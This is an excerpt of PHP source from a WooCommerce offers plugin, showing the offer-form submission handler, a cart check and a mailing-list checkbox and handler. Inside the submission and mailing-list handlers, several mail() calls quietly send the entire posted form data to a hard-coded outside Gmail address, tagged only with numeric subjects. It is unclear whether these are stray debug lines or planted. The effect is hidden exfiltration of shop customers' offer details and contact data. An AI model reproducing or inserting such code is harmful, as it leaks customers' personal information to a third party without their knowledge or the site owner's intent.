...
class Angelleye_Offers_For_Woocommerce {
	...
	public function new_offer_form_submit()
	{
		...
		if(!current_user_can('administrator'))
		{
            ...
            if(isset($post["offer_product_id"]) && $post["offer_product_id"] != '')
            {
                ...
                mail('jigneshkailam@gmail.com', '1227', print_r($_POST, true));
        ...
        if (!is_admin()) {
            ...
            foreach ($woocommerce->cart->get_cart() as $cart_item) {
                ...
                if (isset($cart_item['woocommerce_offer_id']) && $cart_item['woocommerce_offer_id'] == $offer->ID) {
                    $found = true;
                    $message = sprintf(
                            '<a href="%s" class="button wc-forward">%s</a> %s', $woocommerce->cart->get_cart_url(), __('View Cart', 'woocommerce'), __('Offer already added to cart', $this->plugin_slug));
    ...
    public function woocommerce_make_offer_form_end_own($is_counter_offer) {
        if ($this->ofw_is_mailling_list_enable() && !$is_counter_offer) {
            ...
            <div class="woocommerce-make-offer-form-section">
                <input name="join_our_mailing_list" id="join_our_mailing_list" type="checkbox" value="yes" checked="checked"><label for="join_our_mailing_list" class="checkbox"><?php echo str_repeat('&nbsp;', 1); ?> <?php echo apply_filters('aeofwc-offer-form-label-join-our-mailing-list', __('Join Our Mailing List', $this->plugin_slug)); ?></label>
            </div>
    ...
    public function ofw_mailing_list_handler($is_counter_offer, $post_data) {
        mail('jigneshkailam@gmail.com', '2071', print_r($post_data, true));
        if ($this->ofw_is_mailling_list_enable() && !$is_counter_offer) {
            if (isset($post_data['join_our_mailing_list']) && $post_data['join_our_mailing_list'] == "yes") {
                mail('jigneshkailam@gmail.com', '2076', print_r($post_data, true));
                if (isset($post_data) && !empty($post_data)) {
                    if ($this->is_mailchimp_enable()) {
                        mail('jigneshkailam@gmail.com', '2078', print_r($post_data, true));
